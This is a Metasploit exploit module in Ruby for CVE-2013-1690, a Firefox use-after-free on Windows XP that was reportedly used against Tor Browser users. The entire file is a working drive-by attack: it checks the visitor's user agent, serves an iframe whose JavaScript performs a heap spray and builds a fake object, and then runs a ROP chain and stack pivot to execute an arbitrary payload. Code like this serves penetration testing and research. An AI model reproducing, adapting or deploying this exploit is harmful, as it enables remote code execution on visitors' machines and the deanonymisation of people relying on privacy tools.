##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Firefox onreadystatechange Event DocumentViewerImpl Use After Free',
      'Description'    => %q{
        This module exploits a vulnerability found on Firefox 17.0.6, specifically an use
        after free of a DocumentViewerImpl object, triggered via an specially crafted web
        page using onreadystatechange events and the window.stop() API, as exploited in the
        wild on 2013 August to target Tor Browser users.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Nils',        # vulnerability discovery
          'Unknown',     # 1day exploit, prolly the FBI
          'w3bd3vil',    # 1day analysis
          'sinn3r',      # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-1690' ],
          [ 'OSVDB', '94584'],
          [ 'BID', '60778'],
          [ 'URL', 'https://www.mozilla.org/security/announce/2013/mfsa2013-53.html' ],
          [ 'URL', 'https://lists.torproject.org/pipermail/tor-announce/2013-August/000089.html' ],
          [ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=901365' ],
          [ 'URL', 'http://krash.in/ffn0day.txt' ],
          [ 'URL', 'http://hg.mozilla.org/releases/mozilla-esr17/rev/2d5a85d7d3ae' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Payload'        =>
        {
          'BadChars'       => "\x00",
          'DisableNops'    => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Firefox 17 & Firefox 21 / Windows XP SP3',
            {
              'FakeObject' => 0x0c101008, # Pointer to the Sprayed Memory
              'RetGadget'  => 0x77c3ee16, # ret from msvcrt
              'StackPivot' => 0x76C9B4C2, # xcht ecx,esp # or byte ptr[eax], al # add byte ptr [edi+5Eh], bl # ret 8 from IMAGEHLP
              'VFuncPtr'   => 0x0c10100c  # Fake Function Pointer to the Sprayed Memory
            }
          ]
        ],
      'DisclosureDate' => 'Jun 25 2013',
      'DefaultTarget'  => 0))

  end

  def stack_pivot
    pivot = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    pivot << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    pivot << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    pivot << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
    return pivot
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V").first
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    vprint_status("Agent: #{agent}")

    if agent !~ /Windows NT 5\.1/
      print_error("Windows XP not found, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    if agent !~ /Firefox\/17/ or agent !~ /Firefox\/21/
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    my_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource

    # build html
    code = [
      target['VFuncPtr'],
      target['RetGadget'],
      target['StackPivot'],
      junk
    ].pack("V*")
    code << generate_rop_payload('msvcrt', stack_pivot + payload.encoded, {'target'=>'xp'})
    js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))
    js_random = Rex::Text.to_unescape(rand_text_alpha(4), Rex::Arch.endian(target.arch))

    content = <<-HTML
<html>
<body>
<iframe src="#{my_uri}/iframe.html"></iframe>
</body></html>
    HTML

    # build iframe
    iframe = <<-IFRAME
<script>
var z="<body><img src='nonexistant.html' onerror=\\"\\" ></body>";
var test = new Array();
var heap_chunks;
function heapSpray(shellcode, fillsled) {
  var chunk_size, headersize, fillsled_len, code;
  var i, codewithnum;
  chunk_size = 0x40000;
  headersize = 0x10;
  fillsled_len = chunk_size - (headersize + shellcode.length);
  while (fillsled.length <fillsled_len)
    fillsled += fillsled;
  fillsled = fillsled.substring(0, fillsled_len);
  code = shellcode + fillsled;
  heap_chunks = new Array();
  for (i = 0; i<1000; i++)
  {
    codewithnum = "HERE" + code;
    heap_chunks[i] = codewithnum.substring(0, codewithnum.length);
  }
}


function b() {
  for(var c=0;1024>c;c++) {
    test[c]=new ArrayBuffer(180);
    bufView = new Uint32Array(test[c]);
    for (var i=0; i < 45; i++) {
      bufView[i] = #{target['FakeObject']};
    }
  }
}

function a() {
  window.stop();
  var myshellcode = unescape("#{js_code}");
  var myfillsled = unescape("#{js_random}");
  heapSpray(myshellcode,myfillsled);
  b();
  window.parent.frames[0].frameElement.ownerDocument.write(z);
}

document.addEventListener("readystatechange",a,null);
</script>
    IFRAME

    print_status("URI #{request.uri} requested...")

    if request.uri =~ /iframe\.html/
      print_status("Sending iframe HTML")
      send_response(cli, iframe, {'Content-Type'=>'text/html'})
      return
    end

    print_status("Sending HTML")
    send_response(cli, content, {'Content-Type'=>'text/html'})

  end

end
